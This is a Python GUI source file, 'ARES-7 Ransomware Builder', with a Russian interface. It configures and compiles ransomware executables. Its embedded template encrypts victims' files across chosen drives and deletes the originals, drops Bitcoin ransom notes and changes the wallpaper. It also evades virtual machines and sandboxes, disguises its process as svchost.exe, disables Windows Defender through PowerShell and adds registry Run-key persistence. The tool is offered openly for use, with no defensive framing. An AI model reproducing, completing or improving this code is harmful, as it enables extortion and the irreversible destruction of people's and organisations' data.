import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import json
import base64
import os
import subprocess
import sys
import shutil
import tempfile
import threading
import time

class RansomwareBuilder:
    def __init__(self, root):
        self.root = root
        self.root.title("🔐 ARES-7 Ransomware Builder v5.0")
        self.root.geometry("1150x850")
        self.root.configure(bg="#0a0a0a")
        self.root.minsize(1000, 750)
        
        # Цветовая схема
        self.colors = {
            "bg": "#0a0a0a",
            "fg": "#00ff41",
            "accent": "#00cc33",
            "dark": "#111111",
            "gray": "#444444",
            "error": "#ff3333",
            "success": "#00ff41",
            "yellow": "#ffaa00"
        }
        
        self.setup_styles()
        
        # Параметры
        self.params = {
            "algorithm": tk.StringVar(value="AES-256"),
            "drives": [],
            "folders_include": [],
            "folders_exclude": [],
            "extensions": [],
            "encrypted_ext": tk.StringVar(value=".enc"),
            "wallpaper_path": "",
            "ransom_note_name": tk.StringVar(value="READ_ME.txt"),
            "ransom_note_content": tk.StringVar(value="YOUR FILES ARE ENCRYPTED!\n\nSend 0.5 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"),
            "custom_ext": tk.StringVar(),
            "output_name": tk.StringVar(value="ransomware.exe"),
            "output_path": tk.StringVar(value=os.path.expanduser("~/Desktop")),
            "icon_path": "",
            "fake_process": tk.BooleanVar(value=False),
            "fake_process_name": tk.StringVar(value="svchost.exe"),
            "anti_vm": tk.BooleanVar(value=False),
            "hide_process": tk.BooleanVar(value=False),
            "disable_defender": tk.BooleanVar(value=False),
            "add_persistence": tk.BooleanVar(value=False),
            "hide_files_attr": tk.BooleanVar(value=False),
            "sandbox_delay": tk.BooleanVar(value=False)
        }
        
        self.build_frame()
        self._build_lock = threading.Lock()
        
    def setup_styles(self):
        style = ttk.Style()
        style.theme_use("clam")
        
        style.configure("TLabel", background="#0a0a0a", foreground="#00ff41", font=("Segoe UI", 10))
        style.configure("Title.TLabel", background="#0a0a0a", foreground="#00ff41", font=("Segoe UI", 12, "bold"))
        style.configure("TButton", background="#111111", foreground="#00ff41", borderwidth=1, font=("Segoe UI", 9))
        style.map("TButton", background=[("active", "#1a1a1a"), ("pressed", "#2a2a2a")])
        style.configure("Accent.TButton", background="#00cc33", foreground="#000000", borderwidth=0, font=("Segoe UI", 11, "bold"), padding=12)
        style.map("Accent.TButton", background=[("active", "#00dd44"), ("pressed", "#00aa33")])
        style.configure("TCheckbutton", background="#0a0a0a", foreground="#00ff41", font=("Segoe UI", 9))
        style.configure("TFrame", background="#0a0a0a")
        style.configure("TLabelframe", background="#0a0a0a", foreground="#00ff41")
        style.configure("TLabelframe.Label", background="#0a0a0a", foreground="#00ff41")
        style.configure("TNotebook", background="#0a0a0a", borderwidth=0)
        style.configure("TNotebook.Tab", background="#111111", foreground="#00ff41", padding=[12, 4], font=("Segoe UI", 10))
        style.map("TNotebook.Tab", background=[("selected", "#00cc33")], foreground=[("selected", "#000000")])
        style.configure("TEntry", fieldbackground="#111111", foreground="#00ff41", borderwidth=1)
        style.configure("TCombobox", fieldbackground="#111111", foreground="#00ff41", background="#111111")
        
    def build_frame(self):
        header = ttk.Frame(self.root)
        header.pack(fill="x", padx=10, pady=(10, 5))
        
        title_label = ttk.Label(header, text="🔐 ARES-7 Ransomware Builder", style="Title.TLabel", font=("Segoe UI", 16, "bold"))
        title_label.pack(side="left")
        
        version_label = ttk.Label(header, text="v5.0", foreground="#444444")
        version_label.pack(side="left", padx=10)
        
        main_container = ttk.Frame(self.root)
        main_container.pack(fill="both", expand=True, padx=10, pady=5)
        
        self.notebook = ttk.Notebook(main_container)
        self.notebook.pack(fill="both", expand=True)
        
        self.create_tab_encryption()
        self.create_tab_extensions()
        self.create_tab_wallpaper()
        self.create_tab_stealth()
        self.create_tab_build()
        
        self.create_bottom_panel()
        
    def create_bottom_panel(self):
        bottom_frame = ttk.Frame(self.root)
        bottom_frame.pack(side="bottom", fill="x", padx=10, pady=10)
        
        ttk.Separator(bottom_frame, orient="horizontal").pack(fill="x", pady=(0, 10))
        
        status_frame = ttk.Frame(bottom_frame)
        status_frame.pack(fill="x", pady=(0, 5))
        
        self.progress = ttk.Progressbar(status_frame, mode='indeterminate', length=200)
        self.progress.pack(side="right", padx=10)
        self.progress.pack_forget()
        
        self.status_var = tk.StringVar(value="✅ Готов к сборке")
        self.status_label = ttk.Label(status_frame, textvariable=self.status_var, font=("Segoe UI", 10), foreground="#444444")
        self.status_label.pack(side="left")
        
        # Детальная строка
        self.detail_var = tk.StringVar(value="")
        self.detail_label = ttk.Label(status_frame, textvariable=self.detail_var, font=("Segoe UI", 9), foreground="#888888")
        self.detail_label.pack(side="left", padx=(20, 0))
        
        btn_frame = ttk.Frame(bottom_frame)
        btn_frame.pack(fill="x")
        
        self.build_btn = ttk.Button(btn_frame, text="🔥 ПОСТРОИТЬ RANSOMWARE", command=self.start_build, style="Accent.TButton")
        self.build_btn.pack(pady=5)
        
    def create_tab_encryption(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="⚙ Шифрование")
        
        main_grid = ttk.Frame(tab)
        main_grid.pack(fill="both", expand=True, padx=15, pady=15)
        
        left_col = ttk.Frame(main_grid)
        left_col.grid(row=0, column=0, sticky="nw", padx=(0, 20))
        
        ttk.Label(left_col, text="Алгоритм шифрования:", style="Title.TLabel").grid(row=0, column=0, sticky="w", pady=(0, 5))
        algo = ttk.Combobox(left_col, textvariable=self.params["algorithm"], values=["AES-256", "Salsa20", "RSA"], state="readonly", width=20)
        algo.grid(row=1, column=0, sticky="w", pady=(0, 15))
        
        ttk.Label(left_col, text="Расширение зашифрованных файлов:", style="Title.TLabel").grid(row=2, column=0, sticky="w", pady=(0, 5))
        ttk.Entry(left_col, textvariable=self.params["encrypted_ext"], width=20).grid(row=3, column=0, sticky="w", pady=(0, 15))
        
        ttk.Label(left_col, text="Диски для шифрования:", style="Title.TLabel").grid(row=4, column=0, sticky="w", pady=(0, 5))
        drives_frame = ttk.Frame(left_col)
        drives_frame.grid(row=5, column=0, sticky="w", pady=(0, 10))
        
        for d in ["C:\\", "D:\\", "E:\\", "Z:\\"]:
            var = tk.BooleanVar()
            ttk.Checkbutton(drives_frame, text=d, variable=var).pack(side="left", padx=3)
            self.params["drives"].append((d, var))
        
        drive_add_frame = ttk.Frame(left_col)
        drive_add_frame.grid(row=6, column=0, sticky="w")
        self.custom_drive = ttk.Entry(drive_add_frame, width=15)
        self.custom_drive.pack(side="left", padx=(0, 5))
        ttk.Button(drive_add_frame, text="➕ Добавить", command=self.add_drive, width=10).pack(side="left")
        
        right_col = ttk.Frame(main_grid)
        right_col.grid(row=0, column=1, sticky="nsew")
        
        ttk.Label(right_col, text="Папки для шифрования (по одной на строку):", style="Title.TLabel").grid(row=0, column=0, sticky="w", pady=(0, 5))
        self.include_text = tk.Text(right_col, height=5, width=45, bg="#111111", fg="#00ff41", insertbackground="#00ff41", font=("Consolas", 9), relief="flat", borderwidth=1)
        self.include_text.grid(row=1, column=0, sticky="ew", pady=(0, 15))
        
        ttk.Label(right_col, text="Папки для обхода (по одной на строку):", style="Title.TLabel").grid(row=2, column=0, sticky="w", pady=(0, 5))
        self.exclude_text = tk.Text(right_col, height=5, width=45, bg="#111111", fg="#00ff41", insertbackground="#00ff41", font=("Consolas", 9), relief="flat", borderwidth=1)
        self.exclude_text.grid(row=3, column=0, sticky="ew")
        
        main_grid.columnconfigure(1, weight=1)
        right_col.columnconfigure(0, weight=1)
        
    def create_tab_extensions(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="📁 Расширения")
        
        top_panel = ttk.Frame(tab)
        top_panel.pack(fill="x", padx=15, pady=(15, 5))
        
        ttk.Label(top_panel, text="Выберите расширения файлов для шифрования:", style="Title.TLabel").pack(side="left")
        
        btn_panel = ttk.Frame(top_panel)
        btn_panel.pack(side="right")
        ttk.Button(btn_panel, text="Выбрать все", command=self.select_all_extensions, width=12).pack(side="left", padx=2)
        ttk.Button(btn_panel, text="Снять все", command=self.deselect_all_extensions, width=12).pack(side="left", padx=2)
        
        ext_container = ttk.Frame(tab)
        ext_container.pack(fill="both", expand=True, padx=15, pady=(0, 10))
        
        canvas = tk.Canvas(ext_container, bg="#0a0a0a", highlightthickness=0)
        scrollbar = ttk.Scrollbar(ext_container, orient="vertical", command=canvas.yview)
        scrollable = ttk.Frame(canvas)
        
        scrollable.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0, 0), window=scrollable, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        ext_list = [".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".mp3", ".wav", ".mp4", ".avi", ".mkv", ".zip", ".rar", ".7z", ".tar", ".gz", ".exe", ".dll", ".sys", ".msi", ".py", ".js", ".html", ".css", ".php", ".asp", ".jsp", ".xml", ".json", ".sql", ".db", ".mdb", ".sqlite", ".pem", ".key", ".crt", ".csr", ".pfx", ".p12", ".vmdk", ".vhd", ".vdi", ".iso", ".img", ".bin", ".log", ".bak", ".old", ".tmp", ".swp", ".cs", ".cpp", ".c", ".h", ".java", ".class", ".rb", ".go", ".rs"]
        
        self.ext_vars = {}
        for i, ext in enumerate(ext_list):
            var = tk.BooleanVar(value=True)
            ttk.Checkbutton(scrollable, text=ext, variable=var).grid(row=i//6, column=i%6, sticky="w", padx=8, pady=2)
            self.ext_vars[ext] = var
            
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        add_frame = ttk.Frame(tab)
        add_frame.pack(fill="x", padx=15, pady=(0, 15))
        
        ttk.Label(add_frame, text="Добавить своё расширение:", font=("Segoe UI", 9)).pack(side="left")
        self.custom_ext = ttk.Entry(add_frame, width=20)
        self.custom_ext.pack(side="left", padx=5)
        ttk.Button(add_frame, text="➕ Добавить", command=self.add_ext, width=12).pack(side="left")
        
    def create_tab_wallpaper(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="🖼 Обои / Выкуп")
        
        main_frame = ttk.Frame(tab)
        main_frame.pack(fill="both", expand=True, padx=15, pady=15)
        
        wall_frame = ttk.LabelFrame(main_frame, text="Обои рабочего стола", padding=10)
        wall_frame.pack(fill="x", pady=(0, 15))
        
        wall_row = ttk.Frame(wall_frame)
        wall_row.pack(fill="x")
        
        ttk.Label(wall_row, text="Файл изображения:").pack(side="left", padx=(0, 10))
        self.wall_label = ttk.Label(wall_row, text="Не выбрано", foreground="#444444")
        self.wall_label.pack(side="left", padx=(0, 10))
        ttk.Button(wall_row, text="📂 Выбрать", command=self.select_wallpaper, width=12).pack(side="left")
        ttk.Label(wall_row, text="(JPG, PNG, BMP)", foreground="#444444").pack(side="left", padx=10)
        
        note_frame = ttk.LabelFrame(main_frame, text="Файл выкупа", padding=10)
        note_frame.pack(fill="both", expand=True)
        
        note_row = ttk.Frame(note_frame)
        note_row.pack(fill="x", pady=(0, 10))
        
        ttk.Label(note_row, text="Имя файла:").pack(side="left", padx=(0, 10))
        ttk.Entry(note_row, textvariable=self.params["ransom_note_name"], width=30).pack(side="left")
        ttk.Label(note_row, text="(например: READ_ME.txt)", foreground="#444444").pack(side="left", padx=10)
        
        ttk.Label(note_frame, text="Содержимое файла выкупа:").pack(anchor="w", pady=(0, 5))
        self.note_text = tk.Text(note_frame, height=8, width=80, bg="#111111", fg="#00ff41", insertbackground="#00ff41", font=("Consolas", 9), relief="flat", borderwidth=1)
        self.note_text.pack(fill="both", expand=True)
        self.note_text.insert("1.0", self.params["ransom_note_content"].get())
        
    def create_tab_stealth(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="🕵 Скрытность")
        
        main_frame = ttk.Frame(tab)
        main_frame.pack(fill="both", expand=True, padx=15, pady=15)
        
        options = [
            ("Маскировка процесса:", "fake_process", "fake_process_name", "Имя в диспетчере", "svchost.exe"),
            ("Скрытие процесса:", "hide_process", None, "Полное скрытие из Task Manager (требует админ-прав)", None),
            ("Анти-VM:", "anti_vm", None, "Завершить работу при обнаружении виртуальной машины", None)
        ]
        
        for label, var_name, entry_var, desc, default in options:
            frame = ttk.LabelFrame(main_frame, text=label, padding=10)
            frame.pack(fill="x", pady=(0, 10))
            
            row = ttk.Frame(frame)
            row.pack(fill="x")
            
            var = self.params[var_name]
            ttk.Checkbutton(row, text=desc, variable=var).pack(side="left")
            
            if entry_var:
                ttk.Entry(row, textvariable=self.params[entry_var], width=20).pack(side="left", padx=10)
                ttk.Label(row, text=f"(по умолчанию: {default})", foreground="#444444").pack(side="left")
        
        extra_frame = ttk.LabelFrame(main_frame, text="Дополнительные методы обхода", padding=10)
        extra_frame.pack(fill="x", pady=(10, 0))
        
        extra_options = [
            ("Отключение Windows Defender", "disable_defender"),
            ("Добавление в автозагрузку", "add_persistence"),
            ("Скрытие файлов (атрибут +h)", "hide_files_attr"),
            ("Задержка 60 сек (обход песочниц)", "sandbox_delay")
        ]
        
        for desc, var_name in extra_options:
            row = ttk.Frame(extra_frame)
            row.pack(fill="x", pady=2)
            ttk.Checkbutton(row, text=desc, variable=self.params[var_name]).pack(side="left")
        
    def create_tab_build(self):
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="📦 Сборка")
        
        main_frame = ttk.Frame(tab)
        main_frame.pack(fill="both", expand=True, padx=15, pady=15)
        
        name_frame = ttk.LabelFrame(main_frame, text="Выходной файл", padding=10)
        name_frame.pack(fill="x", pady=(0, 10))
        
        name_row = ttk.Frame(name_frame)
        name_row.pack(fill="x")
        
        ttk.Label(name_row, text="Имя файла:").pack(side="left", padx=(0, 10))
        ttk.Entry(name_row, textvariable=self.params["output_name"], width=30).pack(side="left")
        ttk.Label(name_row, text="(например: update.exe)", foreground="#444444").pack(side="left", padx=10)
        
        path_frame = ttk.LabelFrame(main_frame, text="Путь сохранения", padding=10)
        path_frame.pack(fill="x", pady=(0, 10))
        
        path_row = ttk.Frame(path_frame)
        path_row.pack(fill="x")
        
        ttk.Label(path_row, text="Папка:").pack(side="left", padx=(0, 10))
        path_entry = ttk.Entry(path_row, textvariable=self.params["output_path"], width=50)
        path_entry.pack(side="left", padx=(0, 10))
        ttk.Button(path_row, text="📂 Обзор", command=self.select_output_path, width=12).pack(side="left")
        
        icon_frame = ttk.LabelFrame(main_frame, text="Иконка", padding=10)
        icon_frame.pack(fill="x")
        
        icon_row = ttk.Frame(icon_frame)
        icon_row.pack(fill="x")
        
        ttk.Label(icon_row, text="Файл иконки:").pack(side="left", padx=(0, 10))
        self.icon_label = ttk.Label(icon_row, text="Не выбрано (будет стандартная)", foreground="#444444")
        self.icon_label.pack(side="left", padx=(0, 10))
        ttk.Button(icon_row, text="📂 Выбрать", command=self.select_icon, width=12).pack(side="left")
        ttk.Label(icon_row, text="(только .ico)", foreground="#444444").pack(side="left", padx=10)
        
    def select_all_extensions(self):
        for var in self.ext_vars.values():
            var.set(True)
            
    def deselect_all_extensions(self):
        for var in self.ext_vars.values():
            var.set(False)
        
    def add_drive(self):
        drive = self.custom_drive.get().strip()
        if drive and not drive.endswith(":\\"):
            drive += ":\\"
        if drive:
            var = tk.BooleanVar()
            self.params["drives"].append((drive, var))
            self.custom_drive.delete(0, tk.END)
            messagebox.showinfo("Добавлено", f"Диск {drive} добавлен")
            
    def add_ext(self):
        ext = self.custom_ext.get().strip()
        if ext and not ext.startswith("."):
            ext = "." + ext
        if ext:
            var = tk.BooleanVar(value=True)
            self.ext_vars[ext] = var
            messagebox.showinfo("Добавлено", f"Расширение {ext} добавлено")
            self.custom_ext.delete(0, tk.END)
            
    def select_wallpaper(self):
        path = filedialog.askopenfilename(filetypes=[("Images", "*.jpg *.jpeg *.png *.bmp")])
        if path:
            self.params["wallpaper_path"] = path
            self.wall_label.config(text=os.path.basename(path), foreground="#00ff41")
            
    def select_icon(self):
        path = filedialog.askopenfilename(filetypes=[("ICO files", "*.ico")])
        if path:
            self.params["icon_path"] = path
            self.icon_label.config(text=os.path.basename(path), foreground="#00ff41")
            
    def select_output_path(self):
        path = filedialog.askdirectory()
        if path:
            self.params["output_path"].set(path)
            
    def start_build(self):
        with self._build_lock:
            self.build_btn.config(state="disabled", text="⏳ СБОРКА...")
            self.progress.pack(side="right", padx=10)
            self.progress.start(10)
            self.status_var.set("⏳ Начинаем сборку...")
            self.detail_var.set("")
            self.status_label.config(foreground="#ffaa00")
            
            thread = threading.Thread(target=self._build_thread, daemon=True)
            thread.start()
    
    def _build_thread(self):
        try:
            self._build()
        except Exception as e:
            import traceback
            self.root.after(0, lambda: self._show_error(str(e), traceback.format_exc()))
        finally:
            self.root.after(0, self._finish_build)
    
    def _check_pyinstaller(self):
        try:
            import PyInstaller
            return True, "встроенный"
        except ImportError:
            pass
        
        try:
            result = subprocess.run([sys.executable, "-m", "PyInstaller", "--version"], capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                return True, result.stdout.strip()
        except:
            pass
        
        return False, None
    
    def _update_status(self, main_msg, detail_msg="", color="#ffaa00"):
        self.root.after(0, lambda: self.status_var.set(main_msg))
        self.root.after(0, lambda: self.detail_var.set(detail_msg))
        self.root.after(0, lambda: self.status_label.config(foreground=color))
    
    def _build(self):
        self._update_status("📋 Сбор параметров...", "Сбор информации о дисках и папках")
        
        selected_drives = [d for d, var in self.params["drives"] if var.get()]
        if not selected_drives:
            self._show_error("Ошибка", "Выберите хотя бы один диск")
            return
            
        include_folders = [line.strip() for line in self.include_text.get("1.0", tk.END).splitlines() if line.strip()]
        exclude_folders = [line.strip() for line in self.exclude_text.get("1.0", tk.END).splitlines() if line.strip()]
        selected_exts = [ext for ext, var in self.ext_vars.items() if var.get()]
        
        self._update_status("📋 Параметры собраны", f"Диски: {', '.join(selected_drives)} | Расширений: {len(selected_exts)}")
        
        wallpaper_data = ""
        wallpaper_ext = ""
        if self.params["wallpaper_path"]:
            self._update_status("🖼 Обработка обоев...", f"Файл: {os.path.basename(self.params['wallpaper_path'])}")
            with open(self.params["wallpaper_path"], "rb") as f:
                wallpaper_data = base64.b64encode(f.read()).decode()
                wallpaper_ext = os.path.splitext(self.params["wallpaper_path"])[1]
                
        note_content = self.note_text.get("1.0", tk.END).strip()
        
        config = {
            "algorithm": self.params["algorithm"].get(),
            "drives": selected_drives,
            "include_folders": include_folders,
            "exclude_folders": exclude_folders,
            "extensions": selected_exts,
            "encrypted_ext": self.params["encrypted_ext"].get(),
            "wallpaper": wallpaper_data,
            "wallpaper_ext": wallpaper_ext,
            "note_name": self.params["ransom_note_name"].get(),
            "note_content": note_content,
            "fake_process": self.params["fake_process"].get(),
            "fake_process_name": self.params["fake_process_name"].get(),
            "anti_vm": self.params["anti_vm"].get(),
            "hide_process": self.params["hide_process"].get(),
            "disable_defender": self.params["disable_defender"].get(),
            "add_persistence": self.params["add_persistence"].get(),
            "hide_files_attr": self.params["hide_files_attr"].get(),
            "sandbox_delay": self.params["sandbox_delay"].get()
        }
        
        self._update_status("📁 Создание временной директории...", "Подготовка рабочей папки")
        
        with tempfile.TemporaryDirectory() as tmpdir:
            self._update_status("📄 Генерация ransomware.py...", "Создание Python-скрипта шифровальщика")
            ransomware_path = os.path.join(tmpdir, "ransomware.py")
            self._generate_ransomware(config, ransomware_path)
            
            icon_arg = []
            if self.params["icon_path"] and os.path.exists(self.params["icon_path"]):
                self._update_status("🖼 Добавление иконки...", f"Файл: {os.path.basename(self.params['icon_path'])}")
                icon_dest = os.path.join(tmpdir, "icon.ico")
                shutil.copy(self.params["icon_path"], icon_dest)
                icon_arg = ["--icon", icon_dest]
            
            output_name = self.params["output_name"].get()
            output_dir = self.params["output_path"].get()
            
            self._update_status("🔧 Проверка PyInstaller...", "Поиск установленного PyInstaller")
            
            available, version = self._check_pyinstaller()
            
            if not available:
                self._show_error("Ошибка", "PyInstaller не найден! Установите: pip install pyinstaller")
                return
            
            self._update_status("✅ PyInstaller найден", f"Версия: {version if version else 'встроенный'}")
            
            # ============================================================
            # ОПТИМИЗИРОВАННАЯ СБОРКА (быстро, без зависаний)
            # ============================================================
            self._update_status("🔧 СБОРКА EXE (оптимизированная)...", "Анализ и сборка...")
            
            process = subprocess.Popen([
                sys.executable, "-m", "PyInstaller",
                "--onefile",
                "--noconsole",
                "--noconfirm",
                "--log-level", "WARN",
                "--name", os.path.splitext(output_name)[0],
                "--distpath", output_dir,
                "--workpath", os.path.join(tmpdir, "build"),
                "--specpath", tmpdir,
                *icon_arg,
                ransomware_path
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, cwd=tmpdir, encoding='utf-8', errors='replace')
            
            # Быстрое чтение вывода
            last_status = ""
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    if "Analyzing" in output:
                        self._update_status("🔧 Анализ кода...", output.strip()[:60])
                    elif "Building" in output:
                        self._update_status("🔧 Сборка...", output.strip()[:60])
                    elif "Collecting" in output:
                        self._update_status("🔧 Упаковка...", output.strip()[:60])
            
            process.wait()
            
            if process.returncode != 0:
                self._show_error("Ошибка сборки", f"PyInstaller ошибка (код: {process.returncode})")
                return
            
            final_path = os.path.join(output_dir, output_name)
            if os.path.exists(final_path):
                size_mb = os.path.getsize(final_path) / 1024 / 1024
                self._update_status(f"✅ Успешно! {final_path}", f"Размер: {size_mb:.1f} МБ", color="#00ff41")
                self.root.after(0, lambda: messagebox.showinfo("✅ Успех", f"Файл создан!\n\n📁 {final_path}\n\nРазмер: {size_mb:.1f} МБ"))
            else:
                self._show_error("Ошибка", "Файл не создан")
    
    def _show_error(self, title, message):
        self.root.after(0, lambda: messagebox.showerror(title, message))
        self._update_status(f"❌ {message[:50]}...", "", color="#ff3333")
    
    def _finish_build(self):
        self.build_btn.config(state="normal", text="🔥 ПОСТРОИТЬ RANSOMWARE")
        self.progress.stop()
        self.progress.pack_forget()
        if not self.status_var.get().startswith("✅") and not self.status_var.get().startswith("❌"):
            self.status_var.set("✅ Готов к сборке")
            self.detail_var.set("")
            self.status_label.config(foreground="#444444")
    
    def _generate_ransomware(self, config, output_path):
        template = '''
import os as _os
import sys as _sys
import base64 as _base64
import ctypes as _ctypes
import time as _time
import threading as _threading
import subprocess as _subprocess
import winreg as _winreg
from Crypto.Cipher import AES, ChaCha20
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

CONFIG = %s

# === ANTI-VM ===
def detect_vm():
    if not CONFIG["anti_vm"]:
        return False
    try:
        procs = _subprocess.check_output("tasklist", shell=True).decode().lower()
        for ind in ["vbox", "vmware", "virtual"]:
            if ind in procs:
                return True
    except:
        pass
    try:
        sys_info = _subprocess.check_output("wmic computersystem get model", shell=True).decode().lower()
        for ind in ["virtual", "vmware", "vbox"]:
            if ind in sys_info:
                return True
    except:
        pass
    return False

def hide_process():
    if not CONFIG["hide_process"]:
        return
    try:
        PROCESS_INFORMATION_CLASS = 3
        _ctypes.windll.kernel32.SetProcessInformation(
            _ctypes.windll.kernel32.GetCurrentProcess(),
            PROCESS_INFORMATION_CLASS,
            _ctypes.byref(_ctypes.c_int(1)),
            _ctypes.sizeof(_ctypes.c_int)
        )
    except:
        pass

def fake_process_name():
    if not CONFIG["fake_process"]:
        return
    try:
        new_name = CONFIG["fake_process_name"]
        if new_name:
            _ctypes.windll.kernel32.SetConsoleTitleW(new_name)
    except:
        pass

def encrypt_file(path):
    try:
        with open(path, "rb") as f:
            data = f.read()
        if CONFIG["algorithm"] == "AES-256":
            key = _os.urandom(32)
            cipher = AES.new(key, AES.MODE_GCM)
            ct, tag = cipher.encrypt_and_digest(data)
            encrypted = cipher.nonce + tag + ct
        elif CONFIG["algorithm"] == "Salsa20":
            key = _os.urandom(32)
            nonce = _os.urandom(8)
            cipher = ChaCha20.new(key=key, nonce=nonce)
            ct = cipher.encrypt(data)
            encrypted = nonce + ct
        elif CONFIG["algorithm"] == "RSA":
            key = RSA.generate(2048)
            cipher = PKCS1_OAEP.new(key)
            encrypted = cipher.encrypt(data)
        enc_path = path + CONFIG["encrypted_ext"]
        with open(enc_path, "wb") as f:
            f.write(encrypted)
        _os.remove(path)
        return True
    except:
        return False

def walk_and_encrypt(start_path):
    for root, dirs, files in _os.walk(start_path):
        skip = False
        for ex in CONFIG["exclude_folders"]:
            if root.startswith(ex):
                skip = True
                break
        if skip:
            continue
        for file in files:
            ext = _os.path.splitext(file)[1].lower()
            if ext in CONFIG["extensions"]:
                encrypt_file(_os.path.join(root, file))

def set_wallpaper():
    if CONFIG["wallpaper"]:
        img = _base64.b64decode(CONFIG["wallpaper"])
        path = _os.path.join(_os.environ["TEMP"], "wall" + CONFIG["wallpaper_ext"])
        with open(path, "wb") as f:
            f.write(img)
        _ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)

def drop_notes():
    for drive in CONFIG["drives"]:
        for root, dirs, files in _os.walk(drive):
            if any(root.startswith(ex) for ex in CONFIG["exclude_folders"]):
                continue
            note_path = _os.path.join(root, CONFIG["note_name"])
            if not _os.path.exists(note_path):
                with open(note_path, "w") as f:
                    f.write(CONFIG["note_content"])

def disable_defender():
    if not CONFIG["disable_defender"]:
        return
    try:
        _subprocess.run(["powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"], capture_output=True)
    except:
        pass

def add_persistence():
    if not CONFIG["add_persistence"]:
        return
    try:
        key = _winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with _winreg.OpenKey(key, subkey, 0, _winreg.KEY_SET_VALUE) as regkey:
            _winreg.SetValueEx(regkey, "SystemUpdate", 0, _winreg.REG_SZ, _sys.executable)
    except:
        pass

def hide_files():
    if not CONFIG["hide_files_attr"]:
        return
    try:
        for drive in CONFIG["drives"]:
            for root, dirs, files in _os.walk(drive):
                for f in files:
                    if f.endswith(CONFIG["encrypted_ext"]):
                        _os.system(f'attrib +h "{_os.path.join(root, f)}"')
    except:
        pass

def main():
    if detect_vm():
        _sys.exit(0)
    hide_process()
    fake_process_name()
    disable_defender()
    add_persistence()
    if CONFIG["sandbox_delay"]:
        _time.sleep(60)
    threads = []
    for drive in CONFIG["drives"]:
        t = _threading.Thread(target=walk_and_encrypt, args=(drive,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    hide_files()
    drop_notes()
    set_wallpaper()

if __name__ == "__main__":
    main()
'''
        with open(output_path, "w", encoding='utf-8') as f:
            f.write(template % repr(config))

if __name__ == "__main__":
    root = tk.Tk()
    app = RansomwareBuilder(root)
    root.mainloop()